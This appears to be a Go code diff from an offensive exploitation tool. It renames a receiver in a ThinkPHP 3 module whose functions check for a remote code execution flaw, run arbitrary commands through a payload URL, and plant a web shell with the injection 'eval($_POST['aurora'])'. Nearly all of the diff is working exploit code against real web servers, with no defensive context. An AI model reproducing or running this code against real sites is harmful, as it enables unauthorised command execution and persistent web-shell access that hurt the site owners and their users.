@@ -28,21 +28,21 @@ func NewTP3Module(baseUrl string) *TP3Module {
 		checkStr:           "PHP Version",
 	}
 }
-func (m *TP3Module) CheckVul() *util.Response {
-	for _, s := range m.moduleList {
-		resp, err := http.Get(m.BaseUrl + "/?=/" + s)
+func (t *TP3Module) CheckVul() *util.Response {
+	for _, s := range t.moduleList {
+		resp, err := http.Get(t.BaseUrl + "/?=/" + s)
 		if err != nil {
 			return util.Fail(err.Error())
 		}
 		if resp.StatusCode == 200 {
-			m.currentModule = s
+			t.currentModule = s
 			break
 		}
 	}
-	if m.currentModule == "" {
+	if t.currentModule == "" {
 		return util.Fail("no vulnerable")
 	}
-	payloadUrl := m.BaseUrl + "/?s=" + m.currentModule + m.checkVulPayloadUrl
+	payloadUrl := t.BaseUrl + "/?s=" + t.currentModule + t.checkVulPayloadUrl
 	resp, err := http.Get(payloadUrl)
 	if err != nil {
 		return util.Fail(err.Error())
@@ -53,15 +53,15 @@ func (m *TP3Module) CheckVul() *util.Response {
 		return util.Fail(err.Error())
 	}
 
-	if strings.Contains(string(bytes), m.checkStr) {
-		return util.Success("success", m.feature)
+	if strings.Contains(string(bytes), t.checkStr) {
+		return util.Success("success", t.feature)
 	}
 	return util.Fail("no vulnerable")
 
 }
 
-func (m *TP3Module) ExecVul(cmd string) *util.Response {
-	payloadUrl := m.BaseUrl + "/?s=" + m.currentModule + m.execVulPayloadUrl + cmd
+func (t *TP3Module) ExecVul(cmd string) *util.Response {
+	payloadUrl := t.BaseUrl + "/?s=" + t.currentModule + t.execVulPayloadUrl + cmd
 	resp, err := http.Get(payloadUrl)
 	if err != nil {
 		return util.Fail(err.Error())
@@ -73,8 +73,8 @@ func (m *TP3Module) ExecVul(cmd string) *util.Response {
 	return util.Success("success", string(bytes))
 }
 
-func (m *TP3Module) GetShell() *util.Response {
-	sellUrl := m.BaseUrl + "/?s=" + m.currentModule + "/\\think\\module/action/param1/{${eval($_POST['aurora'])}}"
+func (t *TP3Module) GetShell() *util.Response {
+	sellUrl := t.BaseUrl + "/?s=" + t.currentModule + "/\\think\\module/action/param1/{${eval($_POST['aurora'])}}"
 	resp, err := http.Get(sellUrl)
 	if err != nil {
 		return util.Fail(err.Error())
